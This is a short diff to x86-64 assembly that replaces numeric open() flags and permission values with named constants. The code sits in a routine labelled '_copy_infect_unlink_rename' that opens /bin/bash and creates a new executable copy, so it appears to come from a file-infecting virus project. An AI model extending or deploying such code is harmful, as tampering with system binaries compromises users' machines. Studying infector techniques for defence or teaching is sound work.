@@ -165,7 +165,7 @@ _copy_infect_unlink_rename:
 ; open /bin/bash
 	mov rax, SYS_OPEN
 	lea rdi, [rel _bin_bash]
-	mov rsi, 0
+	mov rsi, O_RDONLY
 	syscall
 	cmp rax, 0
 	jle _exit_copy
@@ -176,8 +176,8 @@ _copy_infect_unlink_rename:
 ; open /bin/test
 	mov rax, SYS_OPEN
 	lea rdi, [rel _new_bash]
-	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
-	mov rdx, 493 ; S_IRWXU | S_IRGRP | S_IROTH | S_IXGRP | S_IXOTH
+	mov rsi, O_RDWR | O_CREAT | O_TRUNC ; 578
+	mov rdx, S_IRWXU | S_IRGRP | S_IROTH | S_IXGRP | S_IXOTH ; 493
 	syscall
 	cmp rax, 0
 	jle _exit_copy
